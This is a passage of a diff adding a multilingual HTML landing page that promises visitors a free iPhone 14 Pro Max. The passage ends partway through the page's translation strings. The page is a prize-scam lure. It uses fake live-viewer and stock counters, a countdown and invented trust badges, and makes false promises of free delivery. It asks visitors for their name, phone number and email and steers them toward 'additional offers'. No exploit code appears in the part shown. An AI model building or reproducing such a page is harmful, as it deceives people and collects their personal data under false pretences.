@@ -1,0 +1,1751 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta name="monetag" content="6e0d3ec242259cbf616876799099a5b8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Instant Win - Get Free Prize Now!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap">
+    <style>
+        /* Reset & Base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 15px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            animation: fadeIn 0.8s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Language Selector */
+        .language-selector {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            z-index: 1000;
+        }
+        
+        .lang-btn {
+            background: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            transition: all 0.3s;
+        }
+        
+        .lang-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+        }
+        
+        .lang-dropdown {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            padding: 10px;
+            display: none;
+            min-width: 150px;
+            margin-top: 5px;
+        }
+        
+        .lang-dropdown.active {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        .lang-option {
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: background 0.3s;
+        }
+        
+        .lang-option:hover {
+            background: #f8f9ff;
+        }
+        
+        .lang-flag {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+        
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, var(--header-primary), var(--header-secondary));
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: var(--header-icon);
+            position: absolute;
+            font-size: 120px;
+            opacity: 0.1;
+            top: -30px;
+            right: -30px;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .logo i {
+            font-size: 28px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        h1 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            font-weight: 400;
+        }
+        
+        /* Prize Section */
+        .prize-section {
+            padding: 20px;
+            text-align: center;
+            background: var(--background-light);
+        }
+        
+        .prize-image {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 15px;
+            background: linear-gradient(135deg, var(--image-primary), var(--image-secondary));
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 50px;
+            box-shadow: 0 10px 20px var(--image-shadow);
+        }
+        
+        .prize-title {
+            font-size: 22px;
+            color: var(--text-dark);
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+        
+        .prize-value {
+            font-size: 18px;
+            color: var(--accent-color);
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        /* Steps */
+        .steps {
+            padding: 20px;
+            background: white;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 15px;
+            background: var(--background-light);
+            border-radius: 12px;
+            border-left: 4px solid var(--primary-color);
+            transition: transform 0.3s;
+        }
+        
+        .step:hover {
+            transform: translateX(5px);
+        }
+        
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        .step-text h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+        
+        .step-text p {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        /* Countdown */
+        .countdown {
+            background: linear-gradient(135deg, var(--countdown-primary), var(--countdown-secondary));
+            color: white;
+            padding: 20px;
+            text-align: center;
+            margin: 20px;
+            border-radius: 15px;
+            box-shadow: 0 8px 20px var(--countdown-shadow);
+        }
+        
+        .countdown-title {
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .time-unit {
+            background: rgba(255,255,255,0.2);
+            padding: 10px 15px;
+            border-radius: 10px;
+            min-width: 60px;
+        }
+        
+        .time-label {
+            font-size: 12px;
+            margin-top: 5px;
+            opacity: 0.9;
+            text-transform: uppercase;
+        }
+        
+        /* Form */
+        .form-section {
+            padding: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-dark);
+            font-size: 14px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: inherit;
+            background: var(--background-light);
+            transition: all 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        /* Buttons */
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--btn-primary), var(--btn-secondary));
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px var(--btn-shadow);
+        }
+        
+        .btn:active {
+            transform: translateY(-1px);
+        }
+        
+        .btn i {
+            margin-right: 10px;
+        }
+        
+        /* Live Stats */
+        .live-stats {
+            background: linear-gradient(135deg, #ff9f43, #feca57);
+            color: #2d3436;
+            padding: 12px 20px;
+            border-radius: 10px;
+            margin: 10px;
+            text-align: center;
+            font-size: 14px;
+            animation: pulse 2s infinite;
+            font-weight: 500;
+        }
+        
+        .stock-counter {
+            background: var(--background-light);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px;
+            font-weight: 700;
+            color: var(--accent-color);
+            transition: all 0.3s;
+        }
+        
+        .low-stock {
+            background: linear-gradient(135deg, #ff6b6b, #ff3838);
+            color: white;
+            animation: shake 0.5s infinite;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
+        }
+        
+        /* Offers */
+        .offers-section {
+            padding: 20px;
+        }
+        
+        .offer-btn {
+            background: linear-gradient(135deg, var(--offer-primary), var(--offer-secondary));
+            margin-bottom: 10px;
+        }
+        
+        /* Trust Badges */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            padding: 20px;
+        }
+        
+        .badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .badge i {
+            color: var(--accent-color);
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: var(--background-light);
+            color: #666;
+            font-size: 14px;
+            border-top: 1px solid #ddd;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+        }
+        
+        .footer-links a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        /* Loading */
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            display: none;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            .prize-image {
+                width: 150px;
+                height: 150px;
+                font-size: 40px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .btn {
+                padding: 16px;
+                font-size: 16px;
+            }
+        }
+        
+        /* RTL Support */
+        [dir="rtl"] .step {
+            border-left: none;
+            border-right: 4px solid var(--primary-color);
+        }
+        
+        [dir="rtl"] .step:hover {
+            transform: translateX(-5px);
+        }
+        
+        [dir="rtl"] .btn i {
+            margin-right: 0;
+            margin-left: 10px;
+        }
+        
+        /* CSS Variables */
+        :root {
+            --primary-color: #6a11cb;
+            --secondary-color: #2575fc;
+            --header-primary: #ff416c;
+            --header-secondary: #ff4b2b;
+            --header-icon: "🎁";
+            --background-light: #f8f9ff;
+            --text-dark: #2d3436;
+            --accent-color: #00b894;
+            --image-primary: #667eea;
+            --image-secondary: #764ba2;
+            --image-shadow: rgba(102, 126, 234, 0.3);
+            --btn-primary: #6a11cb;
+            --btn-secondary: #2575fc;
+            --btn-shadow: rgba(106, 17, 203, 0.4);
+            --offer-primary: #8e2de2;
+            --offer-secondary: #4a00e0;
+            --countdown-primary: #ff8a00;
+            --countdown-secondary: #da1b60;
+            --countdown-shadow: rgba(218, 27, 96, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <!-- Language Selector -->
+    <div class="language-selector">
+        <button class="lang-btn" id="langBtn">
+            <span class="lang-flag" id="currentFlag">🌐</span>
+            <span id="currentLang">EN</span>
+            <i class="fas fa-chevron-down"></i>
+        </button>
+        <div class="lang-dropdown" id="langDropdown">
+            <!-- Languages will be added dynamically -->
+        </div>
+    </div>
+    
+    <!-- Loading Spinner -->
+    <div class="spinner-overlay" id="loadingSpinner">
+        <div class="spinner"></div>
+        <div class="spinner-text" id="spinnerText">Loading best offers for you...</div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo" id="logo">
+                <i class="fas fa-gift"></i> <span id="siteName">Daily Rewards</span>
+            </div>
+            <h1 id="mainTitle">🎁 Instant Win! Get iPhone 14 Pro Free</h1>
+            <p class="subtitle" id="subtitle">Join now for a chance to win instantly. 100% Free!</p>
+        </div>
+        
+        <!-- Live Stats -->
+        <div class="live-stats" id="liveStats">
+            <i class="fas fa-users"></i> <span id="liveCounter">24</span> people watching now!
+        </div>
+        
+        <!-- Stock Counter -->
+        <div class="stock-counter" id="stockCounter">
+            <i class="fas fa-box"></i> <span id="stockCount">15</span> prizes remaining only!
+        </div>
+        
+        <!-- Prize Section -->
+        <div class="prize-section">
+            <div class="prize-image" id="prizeImage">
+                <i class="fas fa-mobile-alt" id="prizeIcon"></i>
+            </div>
+            <h2 class="prize-title" id="prizeTitle">iPhone 14 Pro Max</h2>
+            <div class="prize-value" id="prizeValue">Prize Value: $1,299</div>
+            <p id="prizeDesc">Choose your prize and join to win</p>
+        </div>
+        
+        <!-- Steps -->
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text">
+                    <h3 id="step1Title">Choose Your Prize</h3>
+                    <p id="step1Desc">Select from dozens of valuable prizes</p>
+                </div>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text">
+                    <h3 id="step2Title">Enter Your Details</h3>
+                    <p id="step2Desc">Simple information for verification</p>
+                </div>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">
+                    <h3 id="step3Title">Get Your Prize</h3>
+                    <p id="step3Desc">Will be delivered within 24 hours</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Countdown -->
+        <div class="countdown">
+            <div class="countdown-title" id="countdownTitle">⏰ Draw ends in:</div>
+            <div class="countdown-timer">
+                <div>
+                    <div class="time-unit" id="hours">02</div>
+                    <div class="time-label" id="hourLabel">Hours</div>
+                </div>
+                <div>
+                    <div class="time-unit" id="minutes">30</div>
+                    <div class="time-label" id="minuteLabel">Minutes</div>
+                </div>
+                <div>
+                    <div class="time-unit" id="seconds">45</div>
+                    <div class="time-label" id="secondLabel">Seconds</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Form -->
+        <div class="form-section">
+            <div class="form-group">
+                <label for="name" id="nameLabel">Full Name:</label>
+                <input type="text" id="name" class="form-control" placeholder="Enter your name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone" id="phoneLabel">Phone Number:</label>
+                <input type="tel" id="phone" class="form-control" placeholder="Enter your phone" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="email" id="emailLabel">Email Address:</label>
+                <input type="email" id="email" class="form-control" placeholder="example@email.com" required>
+            </div>
+            
+            <button class="btn" id="submitBtn">
+                <i class="fas fa-gift" id="btnIcon"></i> <span id="btnText">Get Your Prize Now</span>
+            </button>
+        </div>
+        
+        <!-- Additional Offers -->
+        <div class="offers-section" id="offersSection">
+            <p style="text-align:center; margin-bottom:15px; color:#666; font-size:14px;" id="offersTitle">
+                To increase your winning chances, choose additional offers:
+            </p>
+            <!-- Offers will be added dynamically -->
+        </div>
+        
+        <!-- Trust Badges -->
+        <div class="trust-badges">
+            <div class="badge">
+                <i class="fas fa-shield-alt"></i>
+                <span id="badge1">100% Secure</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-lock"></i>
+                <span id="badge2">Data Protected</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-truck"></i>
+                <span id="badge3">Free Delivery</span>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p id="footerText">© 2024 Daily Rewards. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#" id="privacyLink">Privacy</a>
+                <a href="#" id="termsLink">Terms</a>
+                <a href="#" id="contactLink">Contact</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== 1. MULTI-LANGUAGE SYSTEM ====================
+        const languages = {
+            en: {
+                code: 'en',
+                name: 'English',
+                flag: '🇺🇸',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'Daily Rewards',
+                    mainTitle: '🎁 Instant Win! Get iPhone 14 Pro Free',
+                    subtitle: 'Join now for a chance to win instantly. 100% Free!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'Prize Value: $1,299',
+                    prizeDesc: 'Choose your prize and join to win',
+                    step1Title: 'Choose Your Prize',
+                    step1Desc: 'Select from dozens of valuable prizes',
+                    step2Title: 'Enter Your Details',
+                    step2Desc: 'Simple information for verification',
+                    step3Title: 'Get Your Prize',
+                    step3Desc: 'Will be delivered within 24 hours',
+                    countdownTitle: '⏰ Draw ends in:',
+                    hourLabel: 'Hours',
+                    minuteLabel: 'Minutes',
+                    secondLabel: 'Seconds',
+                    nameLabel: 'Full Name:',
+                    phoneLabel: 'Phone Number:',
+                    emailLabel: 'Email Address:',
+                    btnText: 'Get Your Prize Now',
+                    offersTitle: 'To increase your winning chances, choose additional offers:',
+                    badge1: '100% Secure',
+                    badge2: 'Data Protected',
+                    badge3: 'Free Delivery',
+                    footerText: '© 2024 Daily Rewards. All rights reserved.',
+                    privacyLink: 'Privacy',
+                    termsLink: 'Terms',
+                    contactLink: 'Contact',
+                    liveStats: ' people watching now!',
+                    stockText: ' prizes remaining only!',
+                    loadingText: 'Loading best offers for you...',
+                    validationName: 'Please enter your full name',
+                    validationPhone: 'Please enter valid phone number',
+                    validationEmail: 'Please enter valid email address',
+                    successMessage: '🎉 Success! Redirecting to your prize...',
+                    exitMessage: '🎁 Wait! Special offer before you leave!'
+                }
+            },
+            es: {
+                code: 'es',
+                name: 'Español',
+                flag: '🇪🇸',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'Premios Diarios',
+                    mainTitle: '🎁 ¡Ganancia Instantánea! Obtén iPhone 14 Pro Gratis',
+                    subtitle: 'Únete ahora para ganar instantáneamente. ¡100% Gratis!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'Valor del Premio: $1,299',
+                    prizeDesc: 'Elige tu premio y participa para ganar',
+                    step1Title: 'Elige Tu Premio',
+                    step1Desc: 'Selecciona entre docenas de premios valiosos',
+                    step2Title: 'Ingresa Tus Datos',
+                    step2Desc: 'Información simple para verificación',
+                    step3Title: 'Recibe Tu Premio',
+                    step3Desc: 'Será entregado en 24 horas',
+                    countdownTitle: '⏰ El sorteo termina en:',
+                    hourLabel: 'Horas',
+                    minuteLabel: 'Minutos',
+                    secondLabel: 'Segundos',
+                    nameLabel: 'Nombre Completo:',
+                    phoneLabel: 'Número de Teléfono:',
+                    emailLabel: 'Correo Electrónico:',
+                    btnText: 'Obtén Tu Premio Ahora',
+                    offersTitle: 'Para aumentar tus posibilidades de ganar, elige ofertas adicionales:',
+                    badge1: '100% Seguro',
+                    badge2: 'Datos Protegidos',
+                    badge3: 'Entrega Gratis',
+                    footerText: '© 2024 Premios Diarios. Todos los derechos reservados.',
+                    privacyLink: 'Privacidad',
+                    termsLink: 'Términos',
+                    contactLink: 'Contacto',
+                    liveStats: ' personas viendo ahora!',
+                    stockText: ' premios restantes solamente!',
+                    loadingText: 'Cargando las mejores ofertas para ti...',
+                    validationName: 'Por favor ingresa tu nombre completo',
+                    validationPhone: 'Por favor ingresa un número de teléfono válido',
+                    validationEmail: 'Por favor ingresa un correo electrónico válido',
+                    successMessage: '🎉 ¡Éxito! Redirigiendo a tu premio...',
+                    exitMessage: '🎁 ¡Espera! ¡Oferta especial antes de que te vayas!'
+                }
+            },
+            fr: {
+                code: 'fr',
+                name: 'Français',
+                flag: '🇫🇷',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'Récompenses Quotidiennes',
+                    mainTitle: '🎁 Gain Instantané ! Obtenez iPhone 14 Pro Gratuit',
+                    subtitle: 'Rejoignez maintenant pour gagner instantanément. 100% Gratuit !',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'Valeur du Prix : 1 299$',
+                    prizeDesc: 'Choisissez votre prix et participez pour gagner',
+                    step1Title: 'Choisissez Votre Prix',
+                    step1Desc: 'Sélectionnez parmi des dizaines de prix précieux',
+                    step2Title: 'Entrez Vos Détails',
+                    step2Desc: 'Informations simples pour vérification',
+                    step3Title: 'Recevez Votre Prix',
+                    step3Desc: 'Sera livré dans les 24 heures',
+                    countdownTitle: '⏰ Le tirage se termine dans :',
+                    hourLabel: 'Heures',
+                    minuteLabel: 'Minutes',
+                    secondLabel: 'Secondes',
+                    nameLabel: 'Nom Complet :',
+                    phoneLabel: 'Numéro de Téléphone :',
+                    emailLabel: 'Adresse Email :',
+                    btnText: 'Obtenez Votre Prix Maintenant',
+                    offersTitle: 'Pour augmenter vos chances de gagner, choisissez des offres supplémentaires :',
+                    badge1: '100% Sécurisé',
+                    badge2: 'Données Protégées',
+                    badge3: 'Livraison Gratuite',
+                    footerText: '© 2024 Récompenses Quotidiennes. Tous droits réservés.',
+                    privacyLink: 'Confidentialité',
+                    termsLink: 'Conditions',
+                    contactLink: 'Contact',
+                    liveStats: ' personnes regardent maintenant !',
+                    stockText: ' prix restants seulement !',
+                    loadingText: 'Chargement des meilleures offres pour vous...',
+                    validationName: 'Veuillez entrer votre nom complet',
+                    validationPhone: 'Veuillez entrer un numéro de téléphone valide',
+                    validationEmail: 'Veuillez entrer une adresse email valide',
+                    successMessage: '🎉 Succès ! Redirection vers votre prix...',
+                    exitMessage: '🎁 Attendez ! Offre spéciale avant votre départ !'
+                }
+            },
+            de: {
+                code: 'de',
+                name: 'Deutsch',
+                flag: '🇩🇪',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'Tägliche Belohnungen',
+                    mainTitle: '🎁 Sofortgewinn! Holen Sie sich iPhone 14 Pro Kostenlos',
+                    subtitle: 'Jetzt mitmachen und sofort gewinnen. 100% Kostenlos!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'Preiswert: 1.299$',
+                    prizeDesc: 'Wählen Sie Ihren Preis und nehmen Sie teil',
+                    step1Title: 'Wählen Sie Ihren Preis',
+                    step1Desc: 'Wählen Sie aus Dutzenden wertvoller Preise',
+                    step2Title: 'Geben Sie Ihre Daten ein',
+                    step2Desc: 'Einfache Informationen zur Überprüfung',
+                    step3Title: 'Erhalten Sie Ihren Preis',
+                    step3Desc: 'Wird innerhalb von 24 Stunden geliefert',
+                    countdownTitle: '⏰ Die Verlosung endet in:',
+                    hourLabel: 'Stunden',
+                    minuteLabel: 'Minuten',
+                    secondLabel: 'Sekunden',
+                    nameLabel: 'Vollständiger Name:',
+                    phoneLabel: 'Telefonnummer:',
+                    emailLabel: 'E-Mail-Adresse:',
+                    btnText: 'Holen Sie sich Ihren Preis Jetzt',
+                    offersTitle: 'Um Ihre Gewinnchancen zu erhöhen, wählen Sie zusätzliche Angebote:',
+                    badge1: '100% Sicher',
+                    badge2: 'Daten Geschützt',
+                    badge3: 'Kostenlose Lieferung',
+                    footerText: '© 2024 Tägliche Belohnungen. Alle Rechte vorbehalten.',
+                    privacyLink: 'Datenschutz',
+                    termsLink: 'Bedingungen',
+                    contactLink: 'Kontakt',
+                    liveStats: ' Personen schauen jetzt zu!',
+                    stockText: ' Preise nur noch übrig!',
+                    loadingText: 'Lade die besten Angebote für Sie...',
+                    validationName: 'Bitte geben Sie Ihren vollständigen Namen ein',
+                    validationPhone: 'Bitte geben Sie eine gültige Telefonnummer ein',
+                    validationEmail: 'Bitte geben Sie eine gültige E-Mail-Adresse ein',
+                    successMessage: '🎉 Erfolg! Leite zu Ihrem Preis weiter...',
+                    exitMessage: '🎁 Warten Sie! Sonderangebot bevor Sie gehen!'
+                }
+            },
+            ar: {
+                code: 'ar',
+                name: 'العربية',
+                flag: '🇸🇦',
+                dir: 'rtl',
+                translations: {
+                    siteName: 'جوائز يومية',
+                    mainTitle: '🎁 فوز فوري! اربح iPhone 14 Pro مجاناً',
+                    subtitle: 'شارك الآن واحصل على فرصة فوز فورية. مجاني 100%!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'قيمة الجائزة: 1,299$',
+                    prizeDesc: 'اختر جائزتك وشارك للفوز',
+                    step1Title: 'اختر جائزتك',
+                    step1Desc: 'اختر من بين عشرات الجوائز القيمة',
+                    step2Title: 'أدخل بياناتك',
+                    step2Desc: 'معلومات بسيطة للتأكد',
+                    step3Title: 'احصل على جائزتك',
+                    step3Desc: 'سيتم الإرسال خلال 24 ساعة',
+                    countdownTitle: '⏰ ينتهي السحب خلال:',
+                    hourLabel: 'ساعة',
+                    minuteLabel: 'دقيقة',
+                    secondLabel: 'ثانية',
+                    nameLabel: 'الاسم الكامل:',
+                    phoneLabel: 'رقم الهاتف:',
+                    emailLabel: 'البريد الإلكتروني:',
+                    btnText: 'احصل على جائزتك الآن',
+                    offersTitle: 'لزيادة فرص فوزك، اختر من العروض الإضافية:',
+                    badge1: 'آمن 100%',
+                    badge2: 'بيانات محمية',
+                    badge3: 'توصيل مجاني',
+                    footerText: '© 2024 جوائز يومية. جميع الحقوق محفوظة.',
+                    privacyLink: 'الخصوصية',
+                    termsLink: 'الشروط',
+                    contactLink: 'الاتصال',
+                    liveStats: ' شخص يشاهدون الآن!',
+                    stockText: ' جائزة متبقية فقط!',
+                    loadingText: 'جاري تحميل أفضل العروض لك...',
+                    validationName: 'يرجى إدخال الاسم الكامل',
+                    validationPhone: 'يرجى إدخال رقم هاتف صحيح',
+                    validationEmail: 'يرجى إدخال بريد إلكتروني صحيح',
+                    successMessage: '🎉 تم بنجاح! جاري تحويلك إلى الجائزة...',
+                    exitMessage: '🎁 انتظر! عرض خاص قبل المغادرة!'
+                }
+            },
+            ru: {
+                code: 'ru',
+                name: 'Русский',
+                flag: '🇷🇺',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'Ежедневные Награды',
+                    mainTitle: '🎁 Мгновенный Выигрыш! Получите iPhone 14 Pro Бесплатно',
+                    subtitle: 'Присоединяйтесь сейчас, чтобы мгновенно выиграть. 100% Бесплатно!',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: 'Стоимость Приза: $1,299',
+                    prizeDesc: 'Выберите свой приз и участвуйте, чтобы выиграть',
+                    step1Title: 'Выберите Ваш Приз',
+                    step1Desc: 'Выберите из десятков ценных призов',
+                    step2Title: 'Введите Ваши Данные',
+                    step2Desc: 'Простая информация для проверки',
+                    step3Title: 'Получите Ваш Приз',
+                    step3Desc: 'Будет доставлен в течение 24 часов',
+                    countdownTitle: '⏰ Розыгрыш заканчивается через:',
+                    hourLabel: 'Часы',
+                    minuteLabel: 'Минуты',
+                    secondLabel: 'Секунды',
+                    nameLabel: 'Полное Имя:',
+                    phoneLabel: 'Номер Телефона:',
+                    emailLabel: 'Адрес Email:',
+                    btnText: 'Получите Ваш Приз Сейчас',
+                    offersTitle: 'Чтобы увеличить шансы на выигрыш, выберите дополнительные предложения:',
+                    badge1: '100% Безопасно',
+                    badge2: 'Данные Защищены',
+                    badge3: 'Бесплатная Доставка',
+                    footerText: '© 2024 Ежедневные Награды. Все права защищены.',
+                    privacyLink: 'Конфиденциальность',
+                    termsLink: 'Условия',
+                    contactLink: 'Контакты',
+                    liveStats: ' человек смотрят сейчас!',
+                    stockText: ' призов осталось только!',
+                    loadingText: 'Загружаем лучшие предложения для вас...',
+                    validationName: 'Пожалуйста, введите ваше полное имя',
+                    validationPhone: 'Пожалуйста, введите действительный номер телефона',
+                    validationEmail: 'Пожалуйста, введите действительный адрес электронной почты',
+                    successMessage: '🎉 Успех! Перенаправляем к вашему призу...',
+                    exitMessage: '🎁 Подождите! Специальное предложение перед уходом!'
+                }
+            },
+            zh: {
+                code: 'zh',
+                name: '中文',
+                flag: '🇨🇳',
+                dir: 'ltr',
+                translations: {
+                    siteName: '每日奖励',
+                    mainTitle: '🎁 即时赢取！免费获得 iPhone 14 Pro',
+                    subtitle: '立即加入，有机会即时赢取。100% 免费！',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: '奖品价值：$1,299',
+                    prizeDesc: '选择您的奖品并参与赢取',
+                    step1Title: '选择您的奖品',
+                    step1Desc: '从数十个有价值的奖品中选择',
+                    step2Title: '输入您的详细信息',
+                    step2Desc: '用于验证的简单信息',
+                    step3Title: '获得您的奖品',
+                    step3Desc: '将在24小时内送达',
+                    countdownTitle: '⏰ 抽奖结束倒计时:',
+                    hourLabel: '小时',
+                    minuteLabel: '分钟',
+                    secondLabel: '秒',
+                    nameLabel: '全名:',
+                    phoneLabel: '电话号码:',
+                    emailLabel: '电子邮件地址:',
+                    btnText: '立即获取您的奖品',
+                    offersTitle: '为增加您的获胜机会，选择附加优惠:',
+                    badge1: '100% 安全',
+                    badge2: '数据受保护',
+                    badge3: '免费配送',
+                    footerText: '© 2024 每日奖励。版权所有。',
+                    privacyLink: '隐私',
+                    termsLink: '条款',
+                    contactLink: '联系',
+                    liveStats: ' 人正在观看！',
+                    stockText: ' 奖品仅剩！',
+                    loadingText: '正在为您加载最佳优惠...',
+                    validationName: '请输入您的全名',
+                    validationPhone: '请输入有效的电话号码',
+                    validationEmail: '请输入有效的电子邮件地址',
+                    successMessage: '🎉 成功！正在重定向到您的奖品...',
+                    exitMessage: '🎁 等等！离开前有特别优惠！'
+                }
+            },
+            ja: {
+                code: 'ja',
+                name: '日本語',
+                flag: '🇯🇵',
+                dir: 'ltr',
+                translations: {
+                    siteName: 'デイリーリワード',
+                    mainTitle: '🎁 即時当選！iPhone 14 Pro 無料ゲット',
+                    subtitle: '今すぐ参加して即時当選のチャンス。100% 無料！',
+                    prizeTitle: 'iPhone 14 Pro Max',
+                    prizeValue: '賞品価値：$1,299',
+                    prizeDesc: '賞品を選んで当選を目指そう',
+                    step1Title: '賞品を選ぶ',
+                    step1Desc: '数十種類の価値ある賞品から選べます',
+                    step2Title: '詳細を入力',
+                    step2Desc: '確認のための簡単な情報',
+                    step3Title: '賞品をゲット',
+                    step3Desc: '24時間以内に配送されます',
+                    countdownTitle: '⏰ 抽選終了まで:',
+                    hourLabel: '時間',
+                    minuteLabel: '分',
+                    secondLabel: '秒',
+                    nameLabel: '氏名:',
+                    phoneLabel: '電話番号:',
